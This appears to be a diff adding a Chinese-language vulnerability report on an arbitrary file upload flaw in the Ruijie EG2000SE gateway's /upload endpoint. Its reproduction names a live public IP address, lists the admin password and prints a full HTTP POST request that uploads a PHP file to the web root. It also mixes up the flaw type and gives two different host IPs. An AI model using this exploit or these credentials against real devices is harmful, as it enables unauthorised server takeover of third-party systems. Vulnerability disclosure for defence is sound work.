@@ -1,0 +1,68 @@
+锐捷EG2000SE网关存在文件上传漏洞
+一、漏洞描述
+锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等全系列的网络设备产品线及解决方案的专业化网络厂商。
+锐捷EG2000SE网关存在命令执行漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。
+本漏洞均为代码审计结果，所以不提供3个互联网案例，提供复现视频。
+二、漏洞影响
+EG2000SE
+三、漏洞位置
+/upload 
+四、代码分析
+这里的upload方法中没有对后缀进行校验，造成任意文件上传。
+![](https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240124133607.png)
+Upload方法中的save方法没有进行任何过滤，通过move_uploaded_file直接将文件进行移动。
+![](https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240124133623.png)
+![](https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240124133631.png)
+五、漏洞复现
+
+https://58.243.187.72:4430/main.htm
+
+登录界面如图所示
+admin/aa123456
+![](https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240124133654.png)
+2.通过以下poc上传1.php，并将<?php echo 123;?>写入到该php文件中。
+POST /upload HTTP/1.1
+Host: 58.243.187.72:4430
+Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=illq9ndgi0gt2cshuofe9h24u6; user=admin; helpKey=home_sysa
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------274423024085850903794508050
+Content-Length: 720
+Origin: https://58.247.239.57:4430
+Referer: https://58.247.239.57:4430/tool/index.php?a=tool
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: iframe
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Te: trailers
+Connection: close
+
+-----------------------------274423024085850903794508050
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+152428800
+-----------------------------274423024085850903794508050
+Content-Disposition: form-data; name="uploadfile"; filename="1.php"
+Content-Type: application/octet-stream
+
+<?php
+echo 123;
+?>
+-----------------------------274423024085850903794508050
+Content-Disposition: form-data; name="fileMoveMode"
+
+.jpg
+-----------------------------274423024085850903794508050
+Content-Disposition: form-data; name="obj"
+
+1
+-----------------------------274423024085850903794508050
+Content-Disposition: form-data; name="filedir"
+
+/tmp/html/
+-----------------------------274423024085850903794508050--
+![](https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240124133708.png)
+3.访问/1.php
+![](https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240124133723.png)
